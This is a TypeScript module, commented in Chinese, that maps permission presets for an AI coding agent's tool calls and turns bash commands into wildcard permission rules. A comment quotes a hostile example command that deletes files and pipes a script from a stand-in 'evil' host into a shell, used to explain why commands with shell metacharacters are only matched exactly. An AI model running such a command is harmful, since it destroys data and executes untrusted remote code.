// 权限建议(SDK canUseTool 的 suggestions)的解读与前缀归纳。
//
// SDK 给的 addRules 建议里,ruleContent 是命令原文(如 "mkdir -p /tmp/foo"),
// 照单全收的话下次换个参数还得再问一遍。CLI 的做法是归纳出前缀模式(如 "mkdir -p *"),
// 这一步 SDK 不做,得我们自己来。
import i18n from "./i18n";
import type { PermissionSuggestion } from "./types";

// ---------- 权限档位 ----------
// 权限其实是两个互不相干的旋钮:SDK 的 permissionMode(它自己判要不要问)、以及会话级"自动同意"
// (sidecar 在 canUseTool 里直接放行)。分开摆出来的结果是用户看不懂自己在哪档 —— 勾了自动同意、
// 模式却还是 default,两个控件谁说了算并不显然。打包成一个选择器,一次写两个旋钮。
// custom 是**推导**出来的:两旋钮的组合不在表里就显示它,但它不是可选项(能显示,不能选进去)。
export type PermissionMode = "default" | "acceptEdits" | "plan" | "bypassPermissions" | "dontAsk" | "auto";
export const PERMISSION_PRESETS: { key: string; mode: PermissionMode; auto: boolean; label: string; desc: string }[] = [
  { key: "ask", mode: "default", auto: false, label: "逐条审批", desc: "每次工具调用都弹卡片等你确认" },
  { key: "edits", mode: "acceptEdits", auto: false, label: "自动接受编辑", desc: "文件编辑直接放行,其余工具照旧确认" },
  { key: "plan", mode: "plan", auto: false, label: "只读规划", desc: "只看不动手:先出方案,你批准后才执行" },
  { key: "all", mode: "default", auto: true, label: "全部放行", desc: "所有工具授权自动同意(要你选方案的提问卡不受影响)" },
];
/** 当前两旋钮对应哪个档位;都不匹配则是派生态 custom(只显示,不可选) */
export const presetOf = (mode: PermissionMode, auto: boolean) =>
  PERMISSION_PRESETS.find((p) => p.mode === mode && p.auto === auto)?.key ?? "custom";

// 这些工具的第一个非 flag 参数是子命令,应当保留("npm run *" 而不是 "npm *")
const SUBCOMMAND_TOOLS = new Set([
  "git", "npm", "npx", "pnpm", "yarn", "bun", "deno", "cargo", "go", "docker",
  "kubectl", "brew", "pip", "pip3", "poetry", "gh", "make",
]);

// 含 shell 元字符时不做归纳:"rm -rf /tmp/x && curl evil.sh | sh" 的前缀是 "rm -rf *",
// 而通配符会把后面整条管道一起放行。这种命令只允许精确匹配。
const SHELL_META = /[|&;<>()`$\n]/;

/**
 * 把一条 bash 命令归纳成权限规则前缀。
 * 保留命令名、子命令与所有 flag,丢掉操作数并以 * 收尾。
 *   mkdir -p /tmp/foo   -> mkdir -p *
 *   npm run test        -> npm run *
 *   git commit -m "x"   -> git commit -m *
 *   npm -v              -> npm -v      (没有操作数,不加通配)
 * 无法安全归纳时返回 null(调用方退回精确匹配)。
 */
export function bashRulePrefix(command: string): string | null {
  const cmd = command.trim();
  if (!cmd || SHELL_META.test(cmd)) return null;
  const toks = cmd.split(/\s+/);

  const keep = [toks[0]];
  let subUsed = false;
  let i = 1;
  for (; i < toks.length; i++) {
    const t = toks[i];
    if (t.startsWith("-")) { keep.push(t); continue; }          // flag:保留
    if (!subUsed && SUBCOMMAND_TOOLS.has(toks[0])) { keep.push(t); subUsed = true; continue; } // 子命令:保留
    break;                                                       // 第一个操作数:到此为止
  }
  const prefix = keep.join(" ");
  const hasOperands = i < toks.length;
  const rule = hasOperands ? `${prefix} *` : prefix;
  return rule === cmd && !hasOperands ? null : rule;             // 归纳结果跟原文一样就没必要提供
}

/** addRules 建议的默认 ruleContent —— Bash 归纳成前缀,其余(如 WebFetch 的 domain:x)照用 */
export function defaultRuleContent(toolName: string, ruleContent: string | undefined, input: any): string {
  if (toolName === "Bash") {
    const command = typeof input?.command === "string" ? input.command : ruleContent ?? "";
    return bashRulePrefix(command) ?? command;
  }
  return ruleContent ?? "";
}

/** 规则最终会落到哪里,用于告知用户 */
export function destinationLabel(d: string): string {
  switch (d) {
    case "localSettings": return i18n.t("写入项目 .claude/settings.local.json");
    case "projectSettings": return i18n.t("写入项目 .claude/settings.json");
    case "userSettings": return i18n.t("写入全局 ~/.claude/settings.json");
    case "session": return i18n.t("仅本次会话有效");
    default: return d;
  }
}

/** 非 addRules 的建议(setMode / addDirectories)怎么描述 */
export function suggestionLabel(s: PermissionSuggestion): string | null {
  if (s.type === "setMode") {
    if (s.mode === "acceptEdits") return i18n.t("本次会话自动接受所有文件编辑");
    if (s.mode === "bypassPermissions") return i18n.t("本次会话跳过所有权限确认");
    return i18n.t("本次会话切换到 {{mode}} 模式", { mode: s.mode });
  }
  if (s.type === "addDirectories") return i18n.t("本次会话放行目录 {{dirs}}", { dirs: s.directories.join("、") });
  return null; // addRules 由调用方单独渲染(带可编辑输入框)
}
